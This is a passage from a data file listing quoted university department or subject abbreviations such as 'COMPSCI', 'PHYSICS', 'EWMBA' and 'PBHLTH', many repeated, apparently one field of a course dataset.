,'FRENCH','COMPSCI','GERMAN','PHYSICS','SLAVIC','PBHLTH','POLECON','SSEASN','PHYSED','UGBA','ENVECON','ETHSTD','COGSCI','ECON','MCELLBI','ANTHRO','CYBER','LEGALST','SLAVIC','EDUC','ELENG','PSYCH','THEATER','JOURN','POLSCI','HISTORY','MATSCI','UGBA','COLWRIT','ECON','ESPM','LEGALST','LS','CHEM','ESPM','ITALIAN','MUSIC','OPTOM','POLSCI','ARESEC','SOCWEL','SOCWEL','CHINESE','SPANISH','EWMBA','GERMAN','JAPAN','CYPLAN','HISTORY','MFE','NUSCTX','GERMAN','PLANTBI','MATSCI','GLOBAL','MUSIC','GLOBAL','FILM','JEWISH','EWMBA','SOCIOL','MBA','ESPM','PUBPOL','CHMENG','INFO','MECENG','MEDIAST','HMEDSCI','EWMBA','PSYCH','EDUC','NUSCTX','VIETNMS','SOCWEL','BIOENG','ESPM','PBHLTH','DUTCH','EDUC','CHMENG','MBA','HISTORY','MECENG','HISTORY','PLANTBI','SANSKR','MFE','FRENCH','LINGUIS','RHETOR','CHMENG','PHILOS','PACS','NUSCTX','ANTHRO','DATASCI','CHINESE','COLWRIT','JAPAN','ARCH','POLSCI','MUSIC','HISTORY','CHEM','BIOENG','ETHSTD','GWS','PORTUG','ARCH','HISTART','LATAMST','NUSCTX','SLAVIC','JOURN','PSYCH','SOCWEL','POLSCI','ENGLISH','AGRS','LS','ECON','POLSCI','LEGALST','INTEGBI','XETHSTD','PSYCH','ELENG','LEGALST','PHYSICS','ARCH','SOCIOL','PBHLTH','SOCIOL','KOREAN','EWMBA','ESPM','JEWISH','ESPM','AEROSPC','INTEGBI','PHILOS','PSYCH','MBA','HISTORY','AMERSTD','PSYCH','UGBA','AGRS','COMLIT','JAPAN','SOCIOL','CIVENG','COLWRIT','OPTOM','SEASIAN','CELTIC','NATAMST','FRENCH','NUCENG','HISTART','POLSCI','SSEASN','MCELLBI','NEU','INTEGBI','PUBPOL','BOSCRSR','CUNEIF','POLSCI','LS','EWMBA','JAPAN','PSYCH','FRENCH','HISTART','INTEGBI','ANTHRO','EWMBA','NEU','HUM','PHILOS','CIVENG','UGIS','VISSTD','SLAVIC','PHYSICS','OPTOM','ENERES','MECENG','ASTRON','RHETOR','ENGIN','EDUC','PBHLTH','PSYCH','SPANISH','LINGUIS','KHMER','ENGLISH','POLSCI','THEATER','AFRICAM','ENGLISH','ECON','ESPM','DUTCH','SPANISH','POLSCI','AFRICAM','ENGIN','CHEM','DEMOG','EALANG','AFRICAM','POLECON','MECENG','PHYSICS','EDUC','LINGUIS','ESPM','INTEGBI','UGBA','JOURN','MUSIC','PHILOS','PUBAFF','ENGLISH','EWMBA','HISTART','MESTU','ITALIAN','PHILOS','FILM','FRENCH','CYPLAN','FRENCH','PSYCH','EDUC','RHETOR','THEATER','CZECH','MECENG','VISSTD','STAT','ASAMST','ELENG','MBA','ART','EPS','GWS','ITALIAN','SPANISH','CIVENG','LINGUIS','ENGLISH','ASTRON','PUBAFF','SEMITIC','BIOENG','LS','LDARCH','MUSIC','GLOBAL','CIVENG','ANTHRO','INDENG','ANTHRO','AFRICAM','KOREAN','LANPRO','CYBER','PSYCH','BUDDSTD','YIDDISH','OPTOM','SOCIOL','CHEM','COMLIT','RHETOR','SOCIOL','OPTOM','COMLIT','FRENCH','PSYCH','PBHLTH','CHICANO','SOCIOL','MONGOLN','KOREAN','JAPAN','COGSCI','COMLIT','GEOG','PHYSICS','FRENCH','EDUC','KOREAN','PHYSICS','XMBA','EPS','HISTART','GERMAN','HISTART','JAPAN','PBHLTH','AFRICAM','PBHLTH','ARCH','MCELLBI','EWMBA','LDARCH','SCMATHE','HISTART','DATASCI','BIOENG','FRENCH','COLWRIT','MCELLBI','MECENG','ESPM','INDENG','SOCIOL','CHICANO','SOCWEL','LDARCH','UGIS','DATA','EPS','INDENG','EDUC','COMPSCI','LDARCH','AFRICAM','LS','PACS','EDUC','SOCWEL','CELTIC','ELENG','EUST','PLANTBI','ENGIN','ASAMST','ESPM','ASAMST','EWMBA','ANTHRO','EDUC','COMPSCI','CUNEIF','BIOENG','ENGLISH','MBA','BUDDSTD','ENVDES','MECENG','CIVENG','MECENG','EDUC','GERMAN','ESPM','SOCWEL','SOCIOL','ENGLISH','ELENG','GERMAN','MFE','EPS','EPS','GEOG','EDUC','ECON','INTEGBI','SOCIOL','POLECON','CELTIC','POLSCI','RHETOR','CIVENG','CHMENG','MUSIC','NATAMST','GERMAN','COLWRIT','INTEGBI','EDUCSPE','PACS','MBA','UGIS','PSYCH','GLOBAL','FRENCH','LDARCH','DEVP','MILAFF','SANSKR','SLAVIC','ITALIAN','MUSIC','EDUC','COMPSCI','COMLIT','EWMBA','GEOG','COLWRIT','ESPM','LS','ANTHRO','GLOBAL','HISTORY','POLSCI','ITALIAN','EDUC','ETHSTD','NUSCTX','SPANISH','ARCH','ENGIN','MATSCI','INTEGBI','HISTART','RHETOR','FILM','DESINV','ESPM','ART','CIVENG','ASTRON','SOCIOL','GLOBAL','EPS','FRENCH','STAT','ANTHRO','ART','CHEM','HISTORY','RHETOR','HUM','HISTORY','HISTART','SSEASN','INDENG','COMLIT','COLWRIT','COLWRIT','CIVENG','MEDIAST','SOCIOL','MCELLBI','THEATER','MUSIC','SCANDIN','ENVDES','EDUC','HISTART','GLOBAL','DESINV','CHEM','ECON','LS','UGBA','LINGUIS','AGRS','MUSIC','COLWRIT','MATH','ENGIN','MEDIAST','CHEM','LINGUIS','ENGIN','COMLIT','PSYCH','AFRICAM','CYPLAN','POLSCI','PORTUG','XMBA','INDENG','MBA','NUSCTX','ARCH','COGSCI','SASIAN','MCELLBI','LEGALST','RDEV','SASIAN','POLSCI','PUBPOL','SOCWEL','INDENG','SPANISH','SCANDIN','INFO','EDUC','POLSCI','BURMESE','PUBPOL','PHILOS','VISSTD','FRENCH','ASTRON','GERMAN','MATH','MATH','LS','EDUC','MBA','ART','AGRS','THAI','NUCENG','SEASIAN','ITALIAN','AFRICAM','PHYSICS','HISTORY','ART','SLAVIC','MUSIC','UGIS','CIVENG','SCANDIN','CHEM','INTEGBI','EDUC','DATA','ENGLISH','HISTORY','GEOG','LS','PBHLTH','RHETOR','SLAVIC','DATASCI','FILIPN','ENVECON','LEGALST','LS','ANTHRO','PBHLTH','CHEM','POLSCI','EDUCSPE','EALANG','ARCH','ANTHRO','COLWRIT','MBA','CHEM','FILM','DEVP','MATSCI','SOCIOL','JEWISH','MATH','PHILOS','POLSCI','ESPM','ANTHRO','TIBETAN','POLSCI','HISTORY','VISSTD','CIVENG','FRENCH','CELTIC','EDUC','COMPSCI','SLAVIC','HISTART','HISTORY','AGRS','GEOG','HISTART','XPOLSCI','ENVDES','ENGLISH','MILSCI','COMLIT','INTEGBI','PBHLTH','EPS','ITALIAN','ASAMST','PHYSICS','POLSCI','SSEASN','ELENG','ESPM','ARCH','MUSIC','POLSCI','ANTHRO','LINGUIS','ARCH','EDUC','ENGIN','OPTOM','PHYSICS','PLANTBI','MELC','ISF','PBHLTH','GERMAN','MUSIC','MCELLBI','TURKISH','CHICANO','DEMOG','MCELLBI','SOCWEL','HISTORY','ARCH','ESPM','ARABIC','LINGUIS','CHEM','HISTART','COLWRIT','COMLIT','MBA','HISTART','SCANDIN','MBA','DATA','EDUC','EDUC','PUBAFF','ECON','LS','ASAMST','VISSCI','EDUC','ELENG','EDUC','MUSIC','MATSCI','MECENG','FRENCH','EDUC','MECENG','CHEM','LDARCH','SLAVIC','LANPRO','ETHSTD','NUCENG','POLSCI','HUM','MECENG','SOCWEL','CIVENG','AFRICAM','AEROENG','FILM','COMLIT','LATIN','PHYSED','SPANISH','COMPSS','SSEASN','ARCH','MELC','HISTORY','ENVECON','ENGIN','SOCIOL','TIBETAN','MBA','PHILOS','MUSIC','MECENG','PHILOS','SOCIOL','CHICANO','CIVENG','CMPBIO','CIVENG','ENGLISH','ESPM','LATIN','MUSIC','INFO','PUBAFF','HISTORY','AGRS','FILM','NWMEDIA','PBHLTH','IAS','XMBA','CHEM','POLSCI','GSPDP','HISTART','ISF','ARESEC','ENGLISH','ENGIN','ENGIN','CHICANO','POLSCI','LDARCH','CHMENG','CHINESE','EALANG','POLSCI','ENGIN','PSYCH','HISTORY','UGBA','MUSIC','LINGUIS','INFO','COMPSCI','ENGLISH','SOCIOL','LATIN','IAS','EDUC','MATH','MELC','EWMBA','PHILOS','ANTHRO','ECON','EPS','PUNJABI','COLWRIT','LATIN','SPANISH','PSYCH','SCANDIN','SOCWEL','UGBA','PUBPOL','PHYSICS','MUSIC','AGRS','EPS','HISTART','COGSCI','ELENG','EDUC','EWMBA','ITALIAN','EDUC','LATIN','MECENG','MECENG','PERSIAN','SLAVIC','SSEASN','TURKISH','RHETOR','ENGLISH','GLOBAL','SCANDIN','SPANISH','SLAVIC','ENGIN','ETHSTD','ANTHRO','ITALIAN','ASTRON','POLSCI','EECS','EALANG','GLOBAL','EWMBA','CIVENG','COLWRIT','YIDDISH','COLWRIT','FILM','MBA','ECON','HEBREW','KOREAN','EPS','LS','LEGALST','DEMOG','THEATER','BIOENG','HISTART','JOURN','RHETOR','SSEASN','NWMEDIA','PACS','VISSCI','MUSIC','CHEM','MUSIC','CYPLAN','NEU','HISTART','SLAVIC','COMPSCI','CHINESE','NUCENG','AFRICAM','GERMAN','HMEDSCI','PBHLTH','COGSCI','INTEGBI','JOURN','KOREAN','RHETOR','LINGUIS','ASAMST','CUNEIF','PBHLTH','PSYCH','GEOG','SCMATHE','NUCENG','SCANDIN','ESPM','PBHLTH','MATH','SASIAN','MCELLBI','COMPSCI','GERMAN','PHYSICS','CHEM','CHINESE','OPTOM','HISTORY','POLSCI','PHILOS','ARESEC','EWMBA','NUCENG','ENGLISH','POLSCI','HISTORY','PHILOS','STAT','EDUC','MCELLBI','CYPLAN','ENGIN','PBHLTH','HISTART','LEGALST','HISTART','PSYCH','GERMAN','INDENG','ECON','CELTIC','HISTART','HISTART','HISTORY','CIVENG','INTEGBI','JEWISH','ELENG','LS','MONGOLN','CHINESE','NEU','GERMAN','SOCWEL','UGBA','VISSTD','VIETNMS','MUSIC','PSYCH','THEATER','SOCIOL','EDUC','BIOENG','PLANTBI','STAT','FILM','MECENG','PACS','POLSCI','THEATER','FRENCH','HISTORY','UGIS','SOCIOL','HMEDSCI','MESTU','PACS','COLWRIT','SPANISH','PBHLTH','FRENCH','ANTHRO','MUSIC','THEATER','ECON','LS','LDARCH','NUCENG','OPTOM','ESPM','COMPBIO','MCELLBI','COLWRIT','FILM','GERMAN','PERSIAN','PBHLTH','EDUC','XMATH','ENGLISH','AGRS','ENGLISH','EWMBA','SLAVIC','ETHSTD','ENERES','PHILOS','DUTCH','UGBA','ENGIN','CYPLAN','EPS','EDUC','GEOG','ECON','MUSIC','XMBA','EDUC','RDEV','MECENG','POLSCI','EDUC','BIOENG','ITALIAN','ANTHRO','CHEM','PBHLTH','GEOG','POLSCI','GLOBAL','SLAVIC','INFO','NUSCTX','ENVDES','GWS','MECENG','PERSIAN','KOREAN','POLECON','PHYSICS','PBHLTH','ENVECON','CELTIC','PUBAFF','UGIS','GEOG','EWMBA','LDARCH','JAPAN','EWMBA','LATIN','HISTART','BIOENG','MECENG','POLSCI','HISTORY','PSYCH','SWEDISH','DEVP','HISTORY','INTEGBI','MELC','SOCIOL','LINGUIS','MBA','MECENG','PBHLTH','SPANISH','POLSCI','PBHLTH','MCELLBI','HISTART','INFO','ENVECON','SOCIOL','CYBER','ITALIAN','ELENG','HISTORY','ART','ESPM','PHILOS','KOREAN','HISTORY','MCELLBI','CIVENG','NUSCTX','POLECON','CHICANO','MATSCI','POLISH','MECENG','MATH','OPTOM','PBHLTH','POLSCI','ECON','MECENG','FRENCH','CHMENG','POLSCI','ASAMST','EWMBA','EPS','HISTART','PSYCH','MBA','MBA','EDUC','ASAMST','GERMAN','STAT','VISSCI','HISTORY','EALANG','PUBAFF','SOCWEL','EDUC','RDEV','HISTORY','BIOENG','ESPM','MCELLBI','COLWRIT','EPS','ARCH','CELTIC','ENGLISH','LEGALST','EWMBA','MBA','FILM','EDUC','PUBPOL','CMPBIO','MECENG','POLSCI','ASTRON','PUBPOL','ESPM','INFO','STAT','UGIS','DUTCH','EPS','INDENG','JEWISH','POLSCI','ESPM','FRENCH','CELTIC','MBA','AGRS','ART','FILM','HISTART','MELC','ARCH','ANTHRO','ENGIN','GLOBAL','MILSCI','STAT','PUBPOL','PHYSED','RHETOR','LS','POLSCI','EDUC','UGBA','LINGUIS','ENGIN','MCELLBI','NEU','MELC','HISTORY','EDUC','UGBA','CHEM','BUDDSTD','GERMAN','MBA','SOCIOL','EDUC','DATA','NATAMST','ENGIN','HISTORY','POLSCI','MBA','HISTART','GREEK','ART','GERMAN','GWS','MECENG','MCELLBI','PUBPOL','MATSCI','ESPM','MBA','MBA','MBA','RDEV','PBHLTH','INTEGBI','ARCH','ESPM','MONGOLN','COLWRIT','EALANG','SEASIAN','GEOG','MCELLBI','SLAVIC','RHETOR','MCELLBI','MCELLBI','SOCWEL','CHMENG','EDUC','ENGIN','EPS','UGBA','EPS','EDUC','XAGRS','CHMENG','HUM','NUCENG','CHEM','NUSCTX','ARMENI','ITALIAN','PBHLTH','POLSCI','GLOBAL','ECON','MECENG','ISF','PSYCH','BUDDSTD','MECENG','MFE','PHYSICS','MCELLBI','CELTIC','ECON','PBHLTH','SLAVIC','CIVENG','DEMOG','LDARCH','MATSCI','GERMAN','UGBA','POLSCI','THEATER','LS','UGBA','OPTOM','MELC','CHEM','ARCH','LS','ITALIAN','MUSIC','HISTART','EDUC','POLSCI','HMEDSCI','ETHSTD','EDUC','LS','MECENG','SPANISH','ANTHRO','COLWRIT','MECENG','PBHLTH','CHINESE','COLWRIT','PERSIAN','GERMAN','HISTART','XMBA','BUDDSTD','TIBETAN','NUSCTX','SEASIAN','SLAVIC','GEOG','HEBREW','RHETOR','MATSCI','PBHLTH','MUSIC','PHYSICS','POLSCI','LS','MECENG','POLSCI','MATSCI','ENGLISH','HISTORY','SOCIOL','CIVENG','HISTART','ESPM','SOCIOL','SSEASN','MELC','CIVENG','INTEGBI','COLWRIT','MCELLBI','MUSIC','MECENG','PLANTBI','PORTUG','EWMBA','AGRS','MUSIC','PUBPOL','FRENCH','MATH','SOCIOL','HISTORY','MBA','RHETOR','ENGIN','LEGALST','INDENG','PHYSICS','AFRICAM','ESPM','MUSIC','EDUC','LS','PHILOS','ESPM','EECS','SLAVIC','POLSCI','SLAVIC','STAT','ESPM','EGYPT','ENGLISH','GLOBAL','UGBA','POLSCI','COMLIT','ENGLISH','ENVDES','AFRICAM','ENGIN','POLISH','TIBETAN','EDUC','MATSCI','FILM','EPS','GWS','PBHLTH','FRENCH','MATH','DESINV','INDENG','ANTHRO','NEU','PHILOS','POLSCI','MATSCI','LINGUIS','PUBPOL','BIOENG','ENGIN','MELC','LINGUIS','PBHLTH','SPANISH','ETHSTD','IAS','CIVENG','AFRICAM','CIVENG','EECS','FOLKLOR','GERMAN','MUSIC','STAT','PHYSICS','FRENCH','PBHLTH','CHICANO','ENERES','HISTORY','MELC','RHETOR','DESINV','POLSCI','PSYCH','SOCWEL','SCANDIN','SLAVIC','ENGIN','ISF','ART','JAPAN','HEBREW','ANTHRO','HEBREW','INDENG','MATSCI','BIOENG','CYBER','MBA','NATAMST','PBHLTH','CYPLAN','MATH','MUSIC','PORTUG','COLWRIT','PSYCH','SOCIOL','AFRICAM','GEOG','POLSCI','ANTHRO','DEMOG','BIOENG','SOCIOL','MATSCI','AFRICAM','PUBAFF','COMLIT','PSYCH','PSYCH','PLANTBI','SOCIOL','AGRS','SOCWEL','CYPLAN','THAI','MCELLBI','MEDIAST','CHINESE','RUSSIAN','EALANG','ITALIAN','SOCIOL','EDUC','OPTOM','BUDDSTD','HISTORY','GEOG','MATSCI','PBHLTH','RHETOR','ENGLISH','LINGUIS','SCANDIN','UGIS','GEOG','PSYCH','AGRS','PBHLTH','MATH','ENGIN','SCMATHE','PSYCH','CHICANO','CHMENG','MUSIC','INTEGBI','FILIPN','GLOBAL','ARESEC','ISF','ARCH','ANTHRO','POLSCI','ECON','DUTCH','SOCWEL','AGRS','EDUC','ELENG','COLWRIT','EALANG','ECON','CIVENG','MECENG','PUBPOL','SEASIAN','SOCIOL','EGYPT','MCELLBI','ENGLISH','SLAVIC','HISTART','EDUC','SOCIOL','COMLIT','NUSCTX','CIVENG','CHEM','DEVENG','PHYSICS','FILM','SOCWEL','AFRICAM','GERMAN','ARESEC','CRITTH','LINGUIS','CHEM','ETHSTD','MUSIC','ELENG','SCANDIN','SOCIOL','RUSSIAN','PSYCH','ELENG','MATH','PBHLTH','ENERES','ESPM','KOREAN','UGBA','ASAMST','BIOENG','PHYSED','SANSKR','ETHSTD','UGBA','RHETOR','EALANG','MCELLBI','EDUC','HISTART','HISTART','URDU','PSYCH','ARMENI','ECON','FRENCH','MECENG','COMLIT','PBHLTH','PHDBA','MEDIAST','POLSCI','LINGUIS','UGIS','ENGLISH','PBHLTH','COMPSCI','LEGALST','RUSSIAN','ECON','EDUC','JEWISH','JEWISH','SOCIOL','COMPSCI','STRELIG','EWMBA','HISTORY','ARMENI','AMERSTD','MATH','CELTIC','MATH','INTEGBI','SANSKR','SOCWEL','JOURN','MCELLBI','MCELLBI','PBHLTH','AFRICAM','COLWRIT','LEGALST','OPTOM','ESPM','JEWISH','CHEM','VISSCI','ARCH','LINGUIS','CELTIC','PBHLTH','PHDBA','BIOENG','ITALIAN','AFRICAM','SSEASN','SLAVIC','RHETOR','INDENG','MCELLBI','DATASCI','NUSCTX','HISTORY','PBHLTH','JOURN','EPS','RDEV','BIOENG','HISTORY','HISTORY','JEWISH','BUDDSTD','LDARCH','HISTORY','PERSIAN','CHICANO','AGRS','NUSCTX','POLSCI','DATASCI','ELENG','EALANG','NUSCTX','RDEV','XSTAT','PBHLTH','EDUC','UKRAINI','FILM','CIVENG','PHYSICS','RHETOR','COGSCI','COLWRIT','MBA','CHEM','MCELLBI','AFRICAM','OPTOM','HMEDSCI','SOCWEL','JAPAN','ETHSTD','HUM','MECENG','EALANG','ESPM','PBHLTH','COMPSCI','EWMBA','MUSIC','NSE','AFRICAM','PHYSED','SCANDIN','PERSIAN','ART','AFRICAM','INTEGBI','HEBREW','OPTOM','HISTORY','PBHLTH','MBA','DEVP','ENGIN','LS','ANTHRO','GERMAN','MATH','DATASCI','PHDBA','UGIS','SASIAN','ENGLISH','LATIN','ENGIN','AGRS','ARCH','HUM','SPANISH','GEOG','COMPSCI','ELENG','DEVSTD','PORTUG','LEGALST','PBHLTH','COMPSCI','INFO','ESPM','MCELLBI','MELC','UGBA','MCELLBI','UGBA','HISTORY','PUBPOL','ENGIN','ARCH','MECENG','NWMEDIA','PSYCH','UGBA','NUCENG','ENERES','OPTOM','ARCH','CHINESE','CUNEIF','HISTORY','MUSIC','ELENG','SOCWEL','ENGIN','AFRICAM','ENGLISH','MELC','NUSCTX','EDUC','PSYCH','COLWRIT','MEDST','THEATER','ETHSTD','BIOENG','HISTART','CELTIC','COGSCI','PBHLTH','SOCWEL','COLWRIT','EDUC','ART','BIOENG','COLWRIT','INTEGBI','POLSCI','COMPSCI','ANTHRO','GEOG','KOREAN','EWMBA','RUSSIAN','STAT','SSEASN','EDUC','CUNEIF','ENGLISH','LDARCH','PUBPOL','SOCIOL','ASTRON','ARCH','BIOENG','CYPLAN','ARCH','ENGLISH','ARCH','HISTART','ENGIN','PHDBA','INFO','BIOENG','NUSCTX','MUSIC','AFRICAM','ENVDES','EDUC','PSYCH','DIGHUM','PLANTBI','AHMA','POLSCI','RUSSIAN','ESPM','BULGARI','ENVDES','EPS','MUSIC','SASIAN','MATSCI','MECENG','ANTHRO','LINGUIS','LS','VISSCI','MATH','CHMENG','ARCH','CLASSIC','CIVENG','ESPM','UGBA','COLWRIT','NUSCTX','INDENG','BIOENG','PSYCH','EWMBA','CIVENG','GERMAN','ENGLISH','RUSSIAN','PBHLTH','HISTORY','GWS','ITALIAN','ENGIN','SSEASN','XEPS','GERMAN','PHILOS','ETHSTD','COMPSCI','EDUC','ETHSTD','NWMEDIA','POLSCI','UGBA','PLANTBI','ESPM','SSEASN','HISTART','EDUC','BIOENG','AFRICAM','PHDBA','FRENCH','ANTHRO','GERMAN','EDUC','LS','CUNEIF','PBHLTH','MUSIC','ESPM','HUM','SCANDIN','DIGHUM','INFO','ELENG','PBHLTH','CMPBIO','CLASSIC','CHINESE','GERMAN','ENGIN','GWS','MECENG','NUSCTX','INDENG','MCELLBI','EPS','EDUC','EWMBA','CHEM','COLWRIT','CIVENG','RHETOR','EWMBA','CIVENG','MBA','RUSSIAN','PBHLTH','LINGUIS','MECENG','HISTART','HISTORY','THEATER','MFE','PBHLTH','ENGIN','SOCIOL','NUCENG','MECENG','MUSIC','PBHLTH','XMCELLB','CHMENG','HISTORY','NEU','SLAVIC','ARCH','PSYCH','UGBA','MCELLBI','UGBA','MCELLBI','FILM','ARCH','DESINV','MECENG','OPTOM','ESPM','CIVENG','ART','ECON','SOCIOL','COLWRIT','SOCWEL','SOCWEL','FRENCH','POLSCI','FRENCH','COMPSCI','POLECON','ELENG','JAPAN','CIVENG','ENGLISH','ENGLISH','MECENG','CHEM','FRENCH','INFO','AFRICAM','JOURN','HMEDSCI','NUSCTX','LDARCH','OPTOM','FRENCH','ANTHRO','ECON','CHICANO','GERMAN','ARABIC','INTEGBI','PBHLTH','ARABIC','PLANTBI','POLSCI','RDEV','RHETOR','COLWRIT','HISTORY','JOURN','MECENG','PSYCH','CLASSIC','CLASSIC','DEVP','MBA','RHETOR','COLWRIT','INTEGBI','PHDBA','UGBA','SPANISH','MILSCI','ENGIN','UGBA','ESPM','MECENG','POLSCI','HEBREW','FRENCH','PHILOS','CELTIC','EDUC','CLASSIC','MECENG','MELC','JOURN','POLSCI','ENVDES','AMERSTD','TURKISH','EDSTEM','TIBETAN','GWS','OPTOM','MATH','ELENG','ENGLISH','SOCIOL','SPANISH','MCELLBI','POLSCI','OPTOM','CIVENG','ETHSTD','ENERES','COMLIT','CIVENG','MUSIC','PHYSED','CLASSIC','CIVENG','SPANISH','SSEASN','GERMAN','ASAMST','CHEM','ECON','SANSKR','ANTHRO','PHYSICS','POLSCI','THEATER','UGIS','EWMBA','LINGUIS','ELENG','DEVENG','HEBREW','OPTOM','SPANISH','ANTHRO','ARESEC','EGYPT','MATH','SCANDIN','SLAVIC','ELENG','ESPM','SOCIOL','CYPLAN','FRENCH','COLWRIT','MFE','INDONES','HISTORY','PBHLTH','HMEDSCI','AFRICAM','MATH','POLSCI','LATIN','PHYSICS','CHMENG','PSYCH','SLAVIC','ELENG','MEDIAST','DEMOG','PLANTBI','GERMAN','LS','ENGLISH','SPANISH','CIVENG','SCANDIN','SCANDIN','PUBPOL','HEBREW','EDUC','ENGLISH','ARCH','NEU','STAT','INDENG','DATASCI','JAPAN','LDARCH','BIOENG','POLSCI','POLSCI','BIOLOGY','DUTCH','EDUC','ANTHRO','MATH','DESINV','PHYSICS','MELC','CHEM','MELC','ARCH','POLSCI','VISSTD','HISTORY','COMPSCI','EECS','SPANISH','GEOG','LINGUIS','ENGLISH','NUSCTX','UGBA','ARCH','LEGALST','CYBER','PLANTBI','CHICANO','CHEM','MECENG','EWMBA','MBA','PHYSICS','ENGLISH','PBHLTH','FRENCH','CYPLAN','CYBER','THEATER','DEVP','ENERES','SCANDIN','SOCIOL','EWMBA','ECON','UGBA','CHMENG','MUSIC','INTEGBI','JAPAN','POLSCI','ENGIN','MCELLBI','EDUC','BIOENG','ENGLISH','POLSCI','HISTORY','CHEM','NATAMST','COLWRIT','FRENCH','ETHSTD','ENERES','UGIS','PHYSICS','SPANISH','EDUC','INTEGBI','MCELLBI','ENGLISH','CUNEIF','INDENG','INTEGBI','CIVENG','NATAMST','INTEGBI','SCMATHE','AFRICAM','GWS','LDARCH','PBHLTH','GEOG','HISTART','HISTORY','ENERES','PSYCH','COMLIT','MELC','CIVENG','NUSCTX','PBHLTH','ASTRON','ANTHRO','PHILOS','GEOG','AFRICAM','ENGLISH','MBA','AFRICAM','PSYCH','RELIGST','LINGUIS','EWMBA','GSPDP','THEATER','ISF','ARCH','ECON','JOURN','LEGALST','LDARCH','HISTART','POLSCI','XMBA','EALANG','INDENG','MBA','SLAVIC','SOCIOL','GSPDP','MUSIC','MUSIC','DUTCH','ETHSTD','PSYCH','BIOENG','SOCIOL','ANTHRO','CHMENG','SCANDIN','SOCWEL','BIOENG','THEATER','EDUC','ESPM','AFRICAM','MBA','MUSIC','CHINESE','DESINV','ASAMST','FRENCH','ECON','FRENCH','GEOG','MCELLBI','EDUC','PHYSED','CLASSIC','PHILOS','GERMAN','EWMBA','FRENCH','ESPM','MBA','ECON','HISTORY','CYPLAN','ISF','MCELLBI','ENVDES','CYPLAN','KHMER','HISTART','LINGUIS','EALANG','POLSCI','GLOBAL','POLSCI','EDUC','GERMAN','CATALAN','UGIS','MCELLBI','ASAMST','HISTORY','PHILOS','NUCENG','BIOENG','HISTART','FRENCH','DEVP','HMEDSCI','PBHLTH','SOCWEL','UGIS','LS','POLSCI','HUM','FRENCH','HISTORY','ITALIAN','MBA','ENGLISH','KOREAN','GLOBAL','AEROENG','MBA','CELTIC','DEVSTD','ENGLISH','BUDDSTD','CIVENG','MELC','CHEM','RHETOR','SASIAN','ECON','MUSIC','EDUC','ARCH','MECENG','MATH','MFE','GEOG','ART','CHICANO','MFE','EPS','FRENCH','MELC','FILM','ARCH','DESINV','PLANTBI','HUNGARI','TIBETAN','PERSIAN','MELC','MATSCI','NATAMST','PUBPOL','JAPAN','PHILOS','VIETNMS','MCELLBI','OPTOM','EDUC','SANSKR','INTEGBI','FRENCH','FRENCH','ESPM','HISTART','ENGLISH','PBHLTH','CLASSIC','VISSTD','IAS','HISTORY','MBA','GLOBAL','ENGLISH','MUSIC','SSEASN','CYPLAN','ARCH','EWMBA','INTEGBI','EDUC','GWS','CHEM','PHYSED','ANTHRO','CIVENG','HISTART','SOCWEL','UGBA','THEATER','ASTRON','COLWRIT','AFRICAM','COGSCI','KOREAN','UKRAINI','EDUC','XMBA','HISTORY','PHILOS','PHYSICS','POLSCI','COGSCI','MUSIC','PSYCH','AEROENG','RHETOR','ESPM','AFRICAM','FRENCH','GERMAN','NUCENG','UGIS','ETHSTD','PBHLTH','PHILOS','SOCIOL','CYPLAN','DATASCI','CRITTH','HISTART','MBA','POLSCI','CHMENG','VISSCI','NAVSCI','GLOBAL','EDUC','MECENG','ENVECON','MUSIC','ESPM','EECS','COMLIT','ETHSTD','HEBREW','EPS','PHDBA','ESPM','CYPLAN','PHYSICS','AFRICAM','SSEASN','RUSSIAN','COLWRIT','HISTORY','PBHLTH','PHYSICS','PUBPOL','COLWRIT','GEOG','JAPAN','ARCH','NUCENG','POLSCI','DEVP','CYPLAN','HISTORY','GWS','POLSCI','MUSIC','EDUC','HEBREW','SOCIOL','ASAMST','STAT','ENVDES','LEGALST','PHYSICS','MPS','POLSCI','INFO','GEOG','HISTART','STAT','LATIN','POLSCI','SOCIOL','STAT','HISTORY','MELC','DATASCI','ETHSTD','UGBA','ENGLISH','ETHSTD','XMBA','AHMA','MCELLBI','EWMBA','EDUC','HISTORY','INDENG','AFRICAM','LANPRO','ASTRON','MECENG','ELENG','BULGARI','PBHLTH','COMLIT','EWMBA','INTEGBI','ANTHRO','CMPBIO','INTEGBI','LDARCH','CELTIC','SPANISH','ARCH','GREEK','CIVENG','EDUC','LATAMST','OPTOM','ETHSTD','MECENG','ARESEC','UGIS','PHYSICS','ANTHRO','ECON','EWMBA','FRENCH','POLSCI','ENERES','PLANTBI','ENVECON','AFRICAM','COLWRIT','POLSCI','BIOENG','ANTHRO','EPS','LINGUIS','CIVENG','INDENG','GWS','MECENG','LINGUIS','MELC','GLOBAL','MECENG','NUSCTX','THEATER','EDUC','CIVENG','ARCH','CHEM','ANTHRO','PBHLTH','OPTOM','JEWISH','POLSCI','SPANISH','CIVENG','AGRS','CUNEIF','MCELLBI','POLSCI','PUBPOL','SOCIOL','IAS','PBHLTH','MBA','MECENG','EDUC','PBHLTH','COGSCI','HISTORY','CHMENG','ESPM','ARCH','DEVSTD','DESINV','INDENG','NATAMST','ESPM','PSYCH','AFRICAM','ECON','NUCENG','EALANG','CLASSIC','PBHLTH','MATH','PSYCH','ENGLISH','ART','DIGHUM','LDARCH','NUCENG','ENGLISH','ESPM','LDARCH','MUSIC','LINGUIS','ART','CHICANO','ART','LATIN','MBA','RHETOR','LS','MATH','MECENG','PBHLTH','PBHLTH','EDUC','SOCIOL','ANTHRO','CHINESE','ENGIN','GEOG','GREEK','PBHLTH','PBHLTH','PUBPOL','EDUC','ELENG','FILM','ISF','EDUC','MCELLBI','MELC','EWMBA','MEDIAST','SOCWEL','THEATER','POLSCI','MATH','MATH','COLWRIT','PBHLTH','GEOG','ENGLISH','MCELLBI','ITALIAN','EALANG','EWMBA','POLSCI','LINGUIS','BIOENG','UGBA','ISF','GREEK','SCANDIN','HISTART','ENGLISH','INFO','LINGUIS','MCELLBI','COMPSCI','LEGALST','CIVENG','EWMBA','PBHLTH','EDUC','CYPLAN','UGBA','SPANISH','SOCIOL','UGIS','MBA','ASIANST','PUBPOL','CHEM','HISTORY','PBHLTH','HISTORY','MATH','PHYSICS','DEMOG','ELENG','ESPM','COLWRIT','GSPDP','LDARCH','RHETOR','SASIAN','EDUC','PBHLTH','XEPS','POLSCI','AFRICAM','DEMOG','FILM','MUSIC','ESPM','ASAMST','COMPSCI','NATAMST','EDUC','ITALIAN','ARABIC','SLAVIC','MBA','CIVENG','JOURN','GEOG','INFO','HISTORY','MBA','EDUC','AGRS','EDUC','MBA','MCELLBI','HISTOR